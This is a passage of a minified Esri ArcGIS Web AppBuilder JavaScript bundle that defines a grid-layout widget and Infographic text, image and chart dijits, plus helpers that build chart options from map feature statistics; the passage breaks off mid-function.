// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"jimu/dijit/GridLayout":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dijit/_WidgetBase dojo/dom-geometry dojo/dom-class dojo/Evented dojo/debounce".split(" "),function(n,k,f,c,a,b,p,g){return n([c,p],{baseClass:"jimu-dijit-gridlayout",declaredClass:"jimu.dijit.GridLayout",container:null,layoutDefinition:null,components:null,editable:!1,_layout:null,_coordinates:null,postCreate:function(){this.inherited(arguments);this._coordinates={};var a={settings:{hasHeaders:!1,
resizeEnabled:this.editable,reorderEnabled:this.editable,selectionEnabled:this.editable},dimensions:{borderWidth:1,dragProxyWidth:0,dragProxyHeight:0},content:this.layoutDefinition};require(["libs/goldenlayout/goldenlayout"],k.hitch(this,function(c){this._layout=new c(a,this.container);this._layout.registerComponent("jimu grid",k.hitch(this,function(a,h){var d;a.parent.config.id=h.id;f.some(this.components,function(e){if(e.id===h.id)return d=e.dijit,a.getElement().html(e.dijit.domNode),!0},this);
a.on("resize",g(k.hitch(this,function(){0<a.width&&0<a.height&&d&&"function"===typeof d.resize&&d.resize(a.width,a.height)}),200));a.on("select",k.hitch(this,function(){this.editable&&a.parent.select();this.emit("mask-click",a.parent.config.id)}))}));this._layout.on("initialised",k.hitch(this,function(){this._resetCoordinate();this.emit("initialised")}));this._layout.on("stateChanged",k.hitch(this,function(){this._resetCoordinate()}));this._layout.init();this.editable||b.add(this._layout.root.childElementContainer[0],
"viewonly");b.add(this._layout.root.childElementContainer[0],"jimu-dijit-gridlayout");setTimeout(k.hitch(this,this.resize),100)}))},destroy:function(){f.forEach(this.components,function(a){a.dijit.destroy()});this._layout.destroy();this.inherited(arguments)},getLayoutDefinition:function(){return this._layout.toConfig().content},resize:function(){var b=a.getMarginBox(this.container);this._layout.updateSize(b.w,b.h)},getComponentSize:function(a){return(a=this._layout.root.contentItems[0].getItemsById(a))&&
0<a.length?(a=a[0].container,{w:a.width,h:a.height}):{w:0,h:0}},getSize:function(){return{w:this._layout.width,h:this._layout.height}},setVisible:function(a,b){var d=this._layout.root.contentItems[0].getItemsById(a);d&&0<d.length&&!1===b?this._hideComponent(d[0]):d&&0!==d.length||!0!==b||this._showComponent(a)},_hideComponent:function(a){a.parent&&a.parent.removeChild(a,!0)},_showComponent:function(a){var b,d,h,e,q,c,g;f.some(this.components,function(d){if(d.id===a)return b=d,!0},this);b&&(e={id:a,
type:"component",componentName:"jimu grid",componentState:{id:a}},d=this._coordinates[a],q=this._layout.root,d?(d[0].type!==q.contentItems[0].type&&(c=q.contentItems[0],q.replaceChild(c,{type:d[0].type,content:[]}),q.contentItems[0].addChild(c)),h=q,f.forEach(d,function(a){g=a.index<=h.contentItems.length?a.index:h.contentItems.length;"component"===a.type?h.addChild(e,g):("stack"!==a.type&&h.contentItems[a.index].type===a.type||h.addChild({type:a.type,content:[]},g),h=h.contentItems[g])},this)):("stack"===
q.contentItems[0].type&&(c=q.contentItems[0],q.replaceChild(c,{type:"column",content:[]}),q.contentItems[0].addChild(c)),q.contentItems[0].addChild(e)))},_resetCoordinate:function(){var a=this._layout.root.getItemsByType("component"),b=function(a,h){var d=a.parent;d&&(f.some(d.contentItems,function(d,e){if(d===a)return h.push({type:d.type,index:e}),!0}),b(d,h))};f.forEach(a,function(a){var d=[];b(a,d);this._coordinates[a.config.id]=d.reverse()},this)}})})},"widgets/Infographic/DijitFactory":function(){define("dojo/aspect dojo/_base/lang ./dijits/TextDijit ./dijits/ImageDijit ./dijits/ChartDijit ./dijits/GaugeDijit ./dijits/NumberDijit".split(" "),
function(n,k,f,c,a,b,p){var g={},m={},l=null,d=null,h=null,e=null,q={};g._dijits=m;g.createDijit=function(t){if(m[t.id])return m[t.id];var g;switch(t.type){case "text":g=f;break;case "image":g=c;break;case "chart":g=a;break;case "gauge":g=b;break;case "number":g=p}if(!g)return console.error("Unknow type:",t.type),null;var y={nls:l,config:t.config,map:d,inSettingPage:h,appConfig:e,jsonId:t.id};k.mixin(y,q);g=new g(y);n.after(g,"destroy",function(){delete m[t.id]});return m[t.id]=g};g.setNls=function(a){l=
a};g.setMap=function(a){d=a;Object.keys(m).forEach(function(a){m[a].setMap(d)})};g.setInSettingPage=function(a){h=a;Object.keys(m).forEach(function(a){m[a].setInSettingPage(h)})};g.setAppConfig=function(a){e=a;Object.keys(m).forEach(function(a){m[a].setAppConfig(e)})};g.setContext=function(a){q=a;Object.keys(m).forEach(function(a){k.mixin(m[a],q)})};return g})},"widgets/Infographic/dijits/TextDijit":function(){define(["dojo/_base/declare","dojo/_base/html","./BaseDijit","./styleUtils"],function(n,
k,f,c){return n([f],{templateString:"\x3cdiv\x3e\x3c/div\x3e",type:"text",config:null,postCreate:function(){this.setConfig(this.config)},setConfig:function(a){this.config=a;k.empty(this.domNode);k.addClass(this.domNode,"table-layout-container");k.addClass(this.domNode,"no-trim");this.innerDom=k.create("div",{},this.domNode);k.place(this.innerDom,this.domNode);a={};c.background.setStyle(this.config.background,a,this);c.font.setStyle(this.config.font,a);c.font.setText(this.config,this);k.setStyle(this.innerDom,
a)}})})},"widgets/Infographic/dijits/BaseDijit":function(){define(["dojo/_base/declare","dijit/_WidgetBase","dijit/_TemplatedMixin","../utils"],function(n,k,f,c){return n([k,f],{templateString:"\x3cdiv\x3ePlease create a sub class\x3c/div\x3e",type:"BaseDijit",config:null,inSettingPage:!0,appConfig:null,constructor:function(a){this.config=a.config},setInSettingPage:function(a){this.inSettingPage=a},setConfig:function(a){this.config=a},setMap:function(a){this.map=a},setDataSource:function(a){c.checkDSIsVaild(a,
this.map,this.appConfig)&&(this.dataSource=a)},resize:function(){},setAppConfig:function(a){this.appConfig=a},onDataSourceDataUpdate:function(a){this.data=a},isDarkTheme:function(){var a=!1;this.appConfig&&("DashboardTheme"!==this.appConfig.theme.name||"default"!==this.appConfig.theme.styles[0]&&"style3"!==this.appConfig.theme.styles[0]?"DartTheme"===this.appConfig.theme.name&&(a=!0):a=!0);return a}})})},"widgets/Infographic/utils":function(){define([],function(){return{checkDSIsVaild:function(n,
k,f){var c=!0;n?"DATA_SOURCE_FROM_FRAMEWORK"===n.dataSourceType?f&&f.dataSource&&f.dataSource.dataSources?f.dataSource.dataSources[n.frameWorkDsId]||(c=!1):c=!1:"DATA_SOURCE_FEATURE_LAYER_FROM_MAP"===n.dataSourceType&&((n=n.layerId)&&k?k.getLayer(n)||(c=!1):c=!1):c=!1;return c},isBaseAxisChart:function(n){return"column"===n||"bar"===n||"line"===n},isInteger:function(n){return"number"===typeof n&&0===n%1}}})},"widgets/Infographic/dijits/styleUtils":function(){define(["dojo/on","dojo/_base/lang","jimu/utils"],
function(n,k,f){var c={background:{setStyle:function(a,b,p){if(!a)return{};b||(b={});c.background.setBackgroundColor(a,b);c.background.setAlignment(a,b);c.background.setLink(a,b,p)},setBackgroundColor:function(a,b){a.backgroundColor&&(b.backgroundColor=a.backgroundColor)},setAlignment:function(a,b){if(a.alignment){if(a.alignment.horizontal)switch(a.alignment.horizontal){case "left":b.textAlign="left";break;case "center":b.textAlign="center";break;case "right":b.textAlign="right";break;default:b.textAlign=
"center"}if(a.alignment.vertical)switch(b.display="table-cell",a.alignment.vertical){case "top":b.verticalAlign="top";break;case "middle":b.verticalAlign="middle";break;case "bottom":b.verticalAlign="bottom";break;default:b.verticalAlign="middle"}}},setLink:function(a,b,c){c.clickHanlder&&(c.clickHanlder[0]&&c.clickHanlder[0].remove(),c.clickHanlder=null,b.cursor="auto");a.link&&(c.clickHanlder=c.own(n(c.domNode,"click",k.hitch(c,function(){window.open(a.link)}))),b.cursor="pointer")}},font:{setText:function(a,
b){var c="";a.text&&(c=a.text);b.innerDom.innerHTML=c},setStyle:function(a,b){if(!a)return{};b||(b={});c.font.setFont(a,b);c.font.setTextColor(a,b);c.font.setFontSize(a,b)},setFont:function(a,b){b.fontWeight="normal";b.fontStyle="normal";b.textDecoration="none";a.font&&(a.font.fontFamily&&(b.fontFamily=a.font.fontFamily),a.font.bold&&(b.fontWeight="bold"),a.font.italic&&(b.fontStyle="italic"),a.font.underline&&(b.textDecoration="underline"))},setTextColor:function(a,b){a.textColor&&(b.color=a.textColor)},
setFontSize:function(a,b){a.fontSize&&(b.fontSize=a.fontSize+"px")}},image:{setStyle:function(a,b,f){if(!a)return{};b||(b={});c.image.setBackgroundImg(a,b,f);c.image.setAlignment(a,b)},setBackgroundImg:function(a,b,c){var g="";if(g=a&&!a.image&&c&&c.folderUrl?"url("+c.folderUrl+"/images/default_image.png)":"url("+f.processUrlInWidgetConfig(a.image,c.folderUrl)+")")b.backgroundImage=g,b.backgroundRepeat="no-repeat",b.backgroundSize="contain"},setAlignment:function(a,c){if(a&&a.background){var b="center",
g="center";if(a.background.alignment){a.background.alignment.horizontal&&(b=a.background.alignment.horizontal);if(a.background.alignment.vertical)switch(a.background.alignment.vertical){case "top":g="top";break;case "middle":g="center";break;case "bottom":g="bottom";break;default:c.verticalAlign="center"}c.backgroundPosition=b+" "+g}}}},dataFormat:{getText:function(a,b){var f="";a.dataFormat&&(f=b?b:a.text,f=c.dataFormat.setDataFomat(a,f),a.dataFormat.prefix&&(f=a.dataFormat.prefix+" "+f),a.dataFormat.suffix&&
(f=f+" "+a.dataFormat.suffix));return f},setDataFomat:function(a,c){var b=a.dataFormat.unit;"none"===a.dataFormat.unit?b="":"percentage"===a.dataFormat.unit&&(b="%");return c=c+b+"("+a.dataFormat.decimalPlaces+") "}}};return c})},"widgets/Infographic/dijits/ImageDijit":function(){define(["dojo/_base/declare","dojo/_base/html","./BaseDijit","./styleUtils"],function(n,k,f,c){return n([f],{templateString:"\x3cdiv\x3e\x3c/div\x3e",type:"image",config:null,constructor:function(a){this.config=a.config},
postCreate:function(){this.setConfig(this.config)},setConfig:function(a){this.config=a;this.domNode.innerHTML="";k.addClass(this.domNode,"table-layout-container");this.innerDom=k.create("div",{"class":"image-node"},this.domNode);k.place(this.innerDom,this.domNode);a={};c.background.setStyle(this.config.background,a,this);c.image.setStyle(this.config,a,this);k.setStyle(this.innerDom,a)}})})},"widgets/Infographic/dijits/ChartDijit":function(){define("dojo/_base/lang dojo/_base/html dojo/_base/array dojo/_base/declare ./BaseDijit moment/moment jimu/dijit/_chartDijitOption jimu/dijit/Chart jimu/DataSourceManager jimu/LayerInfos/LayerInfos".split(" "),
function(n,k,f,c,a,b,p,g,m,l){window.makeTwix(b);return c([a],{templateString:'\x3cdiv\x3e\x3cdiv data-dojo-attach-point\x3d"noDataDiv" class\x3d"no-data-tip"\x3e${nls.noData}\x3c/div\x3e\x3cdiv class\x3d"chart-dom" data-dojo-attach-point\x3d"chartDomNode"\x3e\x3c/div\x3e\x3c /div\x3e',type:"chart",baseClass:"infographic-chart-dijit",layerInfosObj:null,dataSourceManager:null,featuresCountForPreview:50,highLightColor:"#00ffff",dataSource:null,config:null,map:null,maxTimeIntervals:1E4,maxLabels:1E4,
dataSourceType:"",featureLayer:null,constructor:function(a){this.config=a.config;this.layerInfosObj=l.getInstanceSync();this.dataSourceManager=m.getInstance()},postCreate:function(){this.inherited(arguments);this.DEFAULT_CONFIG={type:this.config.type||"column",theme:this._getChartTheme(),labels:[],series:[{data:[]}]};this.domNode.style.width="100%";this.domNode.style.height="100%";this.chartDomNode.style.width="100%";this.chartDomNode.style.height="100%";var a={map:null};this.inSettingPage||(a.map=
this.map);this.chartDijitOption=new p(a);this._initChart();this._updateBackgroundColor()},_getChartTheme:function(){return this.isDarkTheme()?"dark":"light"},clearChart:function(){this._showNodata()},startup:function(){this.inherited(arguments);setTimeout(n.hitch(this,function(){this.chart.resize();this.inSettingPage?this._tryUpdateStatisticsChart():this.dataSource&&this.setDataSource(this.dataSource)}),200)},destroy:function(){this.chart&&this.chart.destroy();this.chart=null;this.inherited(arguments)},
resize:function(){this.chart&&this.chart.resize()},setDataSource:function(a){this.dataSourceType="";this.featureLayer=null;this.inherited(arguments);if(a)if(a.layerId)this._setDataSourceForLayerId(a);else if(a.frameWorkDsId){var d=this._getDsTypeInfoAndDsMeta(a.frameWorkDsId),e=d.dsTypeInfo,d=d.dsMeta;e&&d&&("Features"===d.type?this._setDataSourceForFrameworkFeatures(a,e,d):"FeatureStatistics"===d.type&&this._setDataSourceForFeatureStatistics(a,e,d))}},_getDsTypeInfoAndDsMeta:function(a){var d={dsTypeInfo:null,
dsMeta:null};d.dsTypeInfo=this.dataSourceManager.parseDataSourceId(a);var e=this.appConfig.dataSource&&this.appConfig.dataSource.dataSources;e&&(d.dsMeta=e[a]);return d},_updateBackgroundColor:function(){this.config&&this.config.backgroundColor&&this.setBackgroundColor(this.config.backgroundColor)},setBackgroundColor:function(a){this.domNode.style.backgroundColor=a},setConfig:function(a){this.config=a;this._updateBackgroundColor();this._tryUpdateStatisticsChart()},onDataSourceDataUpdate:function(a){this.inherited(arguments);
"CLIENT_FEATURES"===this.dataSourceType?this._onDataUpdateForClientFeatures(a):"FRAMEWORK_STATISTICS"===this.dataSourceType?this._onDataUpdateForFrameworkStatistics(a):"FRAMEWORK_FEATURES"===this.dataSourceType&&this._onDataUpdateForFrameworkFeatures(a)},_renderChartForServer:function(a){this.chartDijitOption.mockFeatureLayerAndChartConfigValueFieldsForServer(a).then(function(a){a=this.chartDijitOption.getChartOptionForServer(a,this.chart);this._checkIsTooManyLabels(a)||this.chart.updateConfig(a)}.bind(this))},
_renderChart:function(a){this.chartDijitOption.getLoadedLayer(a.featureLayerOrUrlOrLayerDefinition).then(function(d){d=this.chartDijitOption.getChartOption({featureLayer:d,features:a.features,chartConfig:a.config,popupFieldInfosObj:a.popupFieldInfosObj,featureLayerForChartSymbologyChart:a.featureLayerForChartSymbologyChart},this.chart);this._checkIsTooManyLabels(d)||this.chart.updateConfig(d)}.bind(this))},_initChart:function(){this.chart=new g({chartDom:this.chartDomNode,config:this.DEFAULT_CONFIG});
this.chart.placeAt(this.chartDomNode);setTimeout(n.hitch(this,function(){this.chart.resize()}),300)},_tryUpdateStatisticsChart:function(){this._hideNodata();var a=this._getChartConfigFromConfig();a?this.domNode.parentNode?this.data?(this.data.features||(this.data.features=[]),"CLIENT_FEATURES"===this.dataSourceType?this._tryUpdateStatisticsChartForClientFeatures(a):"FRAMEWORK_FEATURES"===this.dataSourceType?this._tryUpdateStatisticsChartForFrameworkFeatures(a):"FRAMEWORK_STATISTICS"===this.dataSourceType&&
this._tryUpdateStatisticsChartForFrameworkStatistics(a)):this._showNodata():this._showNodata():this._showNodata()},_getNodataTextColor:function(){var a="";this.config&&(a="pie"===this.config.type?this.config.dataLabelColor:this.config.horizontalAxisTextColor||this.config.verticalAxisTextColor);a||(a="#666");return a},_getChartConfigFromConfig:function(){var a=null,h=null;if(this.config&&this.config.mode&&this.config.type){h=n.clone(this.config);h.highLightColor=this.highLightColor;var e=h.type,c=
h.mode,a={mode:h.mode,type:h.type},b=[];"feature"===c?b=b.concat(["labelField","valueFields","sortOrder","maxLabels"]):"category"===c?b=b.concat("categoryField dateConfig valueFields sortOrder operation maxLabels nullValue splitField".split(" ")):"count"===c?b=b.concat(["categoryField","dateConfig","sortOrder","maxLabels","splitField"]):"field"===c&&(b=b.concat(["valueFields","operation","sortOrder","maxLabels","nullValue"]));c="backgroundColor seriesStyle showLegend legendTextColor legendTextSize stack area highLightColor".split(" ");
c="pie"===e?c.concat(["showDataLabel","dataLabelColor","dataLabelSize","innerRadius"]):c.concat("showHorizontalAxis horizontalAxisTextColor horizontalAxisTextSize showVerticalAxis verticalAxisTextColor verticalAxisTextSize".split(" "));f.forEach(b,n.hitch(this,function(e){a[e]=h[e]}));f.forEach(c,n.hitch(this,function(e){a[e]=h[e]}))}this._specialSortOrder(a);return a},_specialSortOrder:function(a){if(a){var d=a.sortOrder;"feature"===a.mode&&d&&d.field===a.labelField&&(d.isLabelAxis=!0)}},_hasFeatures:function(){return this.data&&
this.data.features&&0<=this.data.features.length},showNoData:function(){this._showNodata()},_showNodata:function(a){k.addClass(this.domNode,"no-data");"timeInterval"===a?this.noDataDiv.innerHTML=this.nls.parsingperiodTip:"maxLabels"===a&&(this.noDataDiv.innerHTML=this.nls.manyCategoryTip);this.chart.clear()},_hideNodata:function(){k.removeClass(this.domNode,"no-data")},_showMockData:function(a){a=n.clone(a);var d=[];a.labelField&&d.push(a.labelField);a.categoryField&&d.push(a.categoryField);a.valueFields&&
(d=d.concat(a.valueFields));var e={fields:[]},c={attributes:{}};e.fields=f.map(d,n.hitch(this,function(a){c.attributes[a]=0;return{name:a,type:"esriFieldTypeInteger",alias:a}}));this.chart.resize();if(this._checkIsTooManyTimeInterval([c],a))return this._showNodata("timeInterval");this._renderChart({featureLayerOrUrlOrLayerDefinition:e,features:[c],config:a,popupFieldInfosObj:this.popupFieldInfosObj})},_setDataSourceForLayerId:function(a){this.dataSourceType="CLIENT_FEATURES";var d=this.layerInfosObj.getLayerInfoById(a.layerId);
d&&d.getLayerObject().then(n.hitch(this,function(a){this.popupFieldInfosObj=d.getPopupInfo();this.featureLayer=a;this._tryUpdateStatisticsChart()}))},_onDataUpdateForClientFeatures:function(){this._tryUpdateStatisticsChart()},_tryUpdateStatisticsChartForClientFeatures:function(a){if(this.featureLayer){var d=this.data.features;d&&this.inSettingPage&&(d=d.slice(0,this.featuresCountForPreview));this.chart.resize();if(this._checkIsTooManyTimeInterval(d,a))return this._showNodata("timeInterval");var e=
this._getFeatureLayerForSymbolRenderChart();this._renderChart({featureLayerOrUrlOrLayerDefinition:this.featureLayer,features:d,config:a,popupFieldInfosObj:this.popupFieldInfosObj,featureLayerForChartSymbologyChart:e})}else this._showNodata()},_setDataSourceForFrameworkFeatures:function(){this.dataSourceType="FRAMEWORK_FEATURES";this._tryUpdateStatisticsChart()},_onDataUpdateForFrameworkFeatures:function(){this._tryUpdateStatisticsChart()},_getFeatureLayerForSymbolRenderChart:function(a){var d=null;
this.map&&"undefined"!==typeof a?d=this.map.getLayer(a):this.featureLayer&&(d=this.featureLayer);return d},_tryUpdateStatisticsChartForFrameworkFeatures:function(a){var d=this._getDsTypeInfoAndDsMeta(this.dataSource.frameWorkDsId).dsMeta;if(d){var e=this.data.features;e&&this.inSettingPage&&(e=e.slice(0,this.featuresCountForPreview));this.chart.resize();if(this._checkIsTooManyTimeInterval(e,a))return this._showNodata("timeInterval");var c=null;if(a.seriesStyle&&"undefined"!==a.seriesStyle.useLayerSymbology){var b=
this.dataSourceManager.parseDataSourceId(d.id);"undefined"!==typeof b.layerId&&(c=this._getFeatureLayerForSymbolRenderChart(b.layerId))}this._renderChart({featureLayerOrUrlOrLayerDefinition:d.dataSchema,features:e,config:a,popupFieldInfosObj:this.popupFieldInfosObj,featureLayerForChartSymbologyChart:c})}else this._showNodata()},_setDataSourceForFeatureStatistics:function(){this.dataSourceType="FRAMEWORK_STATISTICS";this._tryUpdateStatisticsChart()},_onDataUpdateForFrameworkStatistics:function(){this._tryUpdateStatisticsChart()},
_tryUpdateStatisticsChartForFrameworkStatistics:function(a){var d=this._getDsTypeInfoAndDsMeta(this.dataSource.frameWorkDsId).dsMeta;if(d){this.chart.resize();if(this._checkIsTooManyTimeInterval(this.data.features,a))return this._showNodata("timeInterval");this._renderChartForServer({dataSchema:d.dataSchema,statisticsFeatures:this.data.features,config:a})}else this._showNodata()},_checkIsTooManyLabels:function(a){return(a=a.labels)&&a.length>this.maxLabels?(this._showNodata("maxLabels"),!0):!1},_checkIsTooManyTimeInterval:function(a,
c){var e=c.dateConfig;if(!e||"automatic"===e.minPeriod)return!1;var d=c.categoryField;c=a.map(n.hitch(this,function(a){return a.attributes[d]}));c=c.filter(function(a){return!!a});a=Math.min.apply(Math,c);c=Math.max.apply(Math,c);a=b(a).subtract(1,"seconds").local();c=b(c).add(1,"seconds").local();return Math.round(c.diff(a,e.minPeriod,!0))>=this.maxTimeIntervals}})})},"jimu/dijit/_chartDijitOption":function(){define("dojo/_base/declare dijit/_WidgetBase dojo/on dojo/_base/lang dojo/_base/Color dojo/Deferred esri/graphicsUtils esri/symbols/jsonUtils esri/layers/FeatureLayer esri/graphic jimu/utils jimu/clientStatisticsUtils".split(" "),
function(n,k,f,c,a,b,p,g,m,l,d,h){return n([k],{postMixInProperties:function(){this.nls=window.jimuNls.statisticsChart},constructor:function(a){this.map=a.map},getChartOption:function(a,d){var e=this.getClientStatisticsData(a);this.bindChartEvent(d,a,e,!1);return this.getChartOptionWithData(a,e)},getChartOptionForServer:function(a,d){var e=this.getClientStatisticsData(a,!0);this.bindChartEvent(d,a,e,!1);return this.getChartOptionWithData(a,e)},getLoadedLayer:function(a){return this._getLoadedLayer(a)},
getClientStatisticsData:function(a,d){var e=a.chartConfig,c=e.mode;d={forServer:d,layerDefinition:a.featureLayer,features:a.features};"undefined"!==typeof a.popupFieldInfosObj&&(d.popupFieldInfosObj=a.popupFieldInfosObj);"undefined"!==typeof e.labelField&&(d.labelField=e.labelField);"undefined"!==typeof e.categoryField&&(d.categoryField=e.categoryField);e.valueFields&&"undefined"!==typeof e.valueFields&&(d.valueFields=e.valueFields);"undefined"!==typeof e.operation&&(d.operation=e.operation);"undefined"!==
typeof e.sortOrder&&(d.sortOrder=e.sortOrder);"undefined"!==typeof e.dateConfig&&(d.dateConfig=e.dateConfig);"undefined"!==typeof e.nullValue&&(d.nullValue=e.nullValue);"undefined"!==typeof e.maxLabels&&(d.maxLabels=e.maxLabels);"undefined"!==typeof e.splitField&&(d.splitField=e.splitField);if("feature"===c)return h.getFeatureModeStatisticsInfo(d);if("category"===c)return h.getCategoryModeStatisticsInfo(d);if("count"===c)return h.getCountModeStatisticsInfo(d);if("field"===c)return h.getFieldModeStatisticsInfo(d)},
getChartOptionWithData:function(a,d){if(a.features){a.features=a.features.filter(c.hitch(this,function(a){return!!a.attributes}));var e=a.chartConfig,b=e.type;e.backgroundColor||(e.backgroundColor="transparent");e.hasOwnProperty("showLegend")||(e.showLegend=!1);e.legendTextColor||(e.legendTextColor=this.fontColor);"pie"===b?(e.hasOwnProperty("showDataLabel")||(e.showDataLabel=!0),e.dataLabelColor||(e.dataLabelColor=this.fontColor)):(e.hasOwnProperty("showHorizontalAxis")||(e.showHorizontalAxis=!0),
e.horizontalAxisTextColor||(e.horizontalAxisTextColor=this.fontColor),e.hasOwnProperty("showVerticalAxis")||(e.showVerticalAxis=!0),e.verticalAxisTextColor||(e.verticalAxisTextColor=this.fontColor))}this.popupFieldInfosObj=a.popupFieldInfosObj?a.popupFieldInfosObj:{};this.featureLayer=a.featureLayer;this.features=a.features;d=this._createChartSeries(a,d);return this._mapSettingConfigToChartOption(d,a)},bindChartEvent:function(a,d,b,h){d=d.chartConfig;this.highLightColor=d.highLightColor||"#00ffff";
var e=d.mode;if(this.map&&0!==b.length){d=c.hitch(this,function(a){if("series"===a.componentType){var d=null;if("field"===e)d=this.features;else{var c=b[a.dataIndex];c&&(d=c.dataFeatures)}d&&("mouseover"===a.type?this._mouseOverChartItem(d):"mouseout"===a.type?this._mouseOutChartItem(d):"click"===a.type&&h&&this._zoomToGraphics(d))}});var l=[{name:"mouseover",callback:d},{name:"mouseout",callback:d}];h&&l.push({name:"click",callback:d});l.forEach(c.hitch(this,function(e){a.chart.on(e.name,e.callback)}))}},
mockFeatureLayerAndChartConfigValueFieldsForServer:function(a){var e=a.statisticsFeatures,d=a.config;a=a.dataSchema.fields;var b={type:"Table",fields:[]},h=c.clone(d),l=d.mode;"category"===l?(h.valueFields=[],b.fields=d.valueFields.map(c.hitch(this,function(a){var e=d.operation;"average"===e&&(e="avg");var c=a+"_"+e,e=a+"_"+e;h.valueFields.push(a);return{name:c,type:"esriFieldTypeDouble",alias:e}})),a.some(c.hitch(this,function(a){return a.name===d.categoryField?(b.fields.push(a),!0):!1}))):"count"===
l?(this._mockModeForServer=!0,h.mode="feature",h.labelField=d.categoryField,h.valueFields=["count"],a.some(c.hitch(this,function(a){return a.name===d.categoryField?(b.fields.push(a),!0):!1})),b.fields.push({name:"count",type:"esriFieldTypeInteger",alias:this.nls.count})):"field"===l&&(h.valueFields=[],b.fields=d.valueFields.map(c.hitch(this,function(a){var e=d.operation;"average"===e&&(e="avg");var c=a+"_"+e,e=a+"_"+e;h.valueFields.push(a);return{name:c,type:"esriFieldTypeDouble",alias:e}})));return this._getLoadedLayer(b).then(c.hitch(this,
function(a){return{featureLayer:a,features:e,chartConfig:h}}))},_getLoadedLayer:function(a){var e=new b,d=null,d="string"===typeof a?new m(a):"esri.layers.FeatureLayer"===a.declaredClass?a:new m({layerDefinition:c.clone(a),featureSet:null});d.loaded?e.resolve(d):this.own(f(d,"load",c.hitch(this,function(){e.resolve(d)})));return e},_createChartSeries:function(a,d){var e=a.chartConfig.mode;return"feature"===e||"category"===e?this._getCategoryModeChartOptionsByStatisticsInfo(a,d):"count"===e?this._getCountModeChartOptionsByStatisticsInfo(a,
d):"field"===e?this._getFieldModeChartOptionByStatisticsInfo(a,d):null},_mapSettingConfigToChartOption:function(a,d,b){var e=d.chartConfig,h=e.type;d=e.mode;b={type:h,dataZoom:["inside","slider"],confine:!0,backgroundColor:e.backgroundColor,legend:e.showLegend,theme:b||"light",advanceOption:function(a){e.showLegend&&a.legend&&(a.legend.textStyle||(a.legend.textStyle={}),a.legend.textStyle.color=e.legendTextColor,a.legend.textStyle.fontSize=e.legendTextSize);"pie"===h?a.series&&0<a.series.length&&
a.series.forEach(c.hitch(this,function(a){"pie"===a.type&&(a.label||(a.label={}),a.label.normal||(a.label.normal={}),a.label.normal.show=e.showDataLabel,a.label.normal.textStyle||(a.label.normal.textStyle={}),a.label.normal.textStyle.color=e.dataLabelColor,a.label.normal.textStyle.fontSize=e.dataLabelSize)})):(a.xAxis||(a.xAxis={}),a.xAxis.axisLabel||(a.xAxis.axisLabel={}),a.xAxis.axisLabel.textStyle||(a.xAxis.axisLabel.textStyle={}),a.xAxis.axisLabel.textStyle.color=e.horizontalAxisTextColor,a.xAxis.axisLabel.textStyle.fontSize=
e.horizontalAxisTextSize,a.yAxis||(a.yAxis={}),a.yAxis.axisLabel||(a.yAxis.axisLabel={}),a.yAxis.axisLabel.textStyle||(a.yAxis.axisLabel.textStyle={}),a.yAxis.axisLabel.textStyle.color=e.verticalAxisTextColor,a.yAxis.axisLabel.textStyle.fontSize=e.verticalAxisTextSize)}};if("pie"===h&&"field"!==d&&(d=e.seriesStyle)&&d.styles&&d.styles[0]&&(d=d.styles[0].style)&&Array.isArray(d.color)){var l=c.clone(d.color);2===l.length&&(l=this._getColors(c.clone(d.color),6));b.color=l}"pie"===h&&(b.innerRadius=
e.innerRadius,b.labelLine=!!e.showDataLabel);-1<["column","bar","line"].indexOf(h)&&(e.stack||(e.stack=!1),"line"!==h||e.area||(e.area=!1),"line"===h&&(b.area=e.area),"column"===h||"bar"===h||"line"===h&&e.area)&&(b.stack=e.stack);c.mixin(a,b);"pie"!==h&&(a.axisPointer=!0,a.scale=!1,a.hidexAxis=!e.showHorizontalAxis,a.hideyAxis=!e.showVerticalAxis);return a},_getColors:function(a,d){var e=[];if(2===a.length)e=this._createGradientColors(a[0],a[a.length-1],d);else{for(var c=Math.ceil(d/a.length),b=
0;b<c;b++)e=e.concat(a);e=e.slice(0,d)}return e},_createGradientColors:function(d,c,b){var e=[];d=new a(d);var h=new a(c);c=(h.r-d.r)/b;for(var l=(h.g-d.g)/b,h=(h.b-d.b)/b,q=new a,g=0,t=0,f=0,m=0;m<b;m++)g=parseInt(d.r+c*m,10),t=parseInt(d.g+l*m,10),f=parseInt(d.b+h*m,10),q.setColor([g,t,f]),e.push(q.toHex());return e},_getFieldModeChartOptionByStatisticsInfo:function(a,d){var e=a.chartConfig,b=e.type,h=a.featureLayerForChartSymbologyChart,l={type:b,labels:[],series:[{type:b,data:[]}]};d.forEach(c.hitch(this,
function(a){var d=a.label,c=this._getFieldAlias(a.label),b=a.value;l.labels.push(c);a=this._getSerieDataItem({item:a,value:b,label:c,_originLabel:d},e,h);l.series[0].data.push(a)}));l.series=this._assignColorsToSeries(e,l.series);return l},_getCountModeChartOptionsByStatisticsInfo:function(a,d){var e=a.chartConfig,b=e.type,h=a.featureLayerForChartSymbologyChart,l=!1;0<d.length&&(l=d.every(function(a){return!!a.splitedValueFields}));if(l)return this._getSplitedSeriesForCategoryOrCountMode(d,a,e);var q=
{type:b,labels:[],series:[{type:b,data:[]}]};d.forEach(c.hitch(this,function(a){var d=a.count,c=a.fieldValue,b=a.originValue;q.labels.push(c);a=this._getSerieDataItem({item:a,value:d,label:c,_originLabel:b},e,h);q.series[0].data.push(a)}));q.series=this._assignColorsToSeries(e,q.series);return q},_getCategoryModeChartOptionsByStatisticsInfo:function(a,d){var e=a.chartConfig,b=e.type,h=this._getFieldAliasObjactArray(e.valueFields),l=null,q=a.featureLayerForChartSymbologyChart,g=!1;0<d.length&&(g=d.every(function(a){return!!a.splitedValueFields}));
if(g)return this._getSplitedSeriesForCategoryOrCountMode(d,a,e);if("radar"===b)return a=h.map(function(a){return{name:a.alias}}),d=this._getSeriesOfRadar(d),l={type:b,indicator:a,series:d};l={type:b,labels:[],series:[]};l.series=h.map(c.hitch(this,function(a){return{name:a.alias,_originName:a.name,type:b,data:[]}}));d.forEach(c.hitch(this,function(a){var d=a.category,c=a.originValue;l.labels.push(d);for(var b=0;b<a.valueFields.length;b++){var h=this._getSerieDataItem({item:a,value:a.valueFields[b],
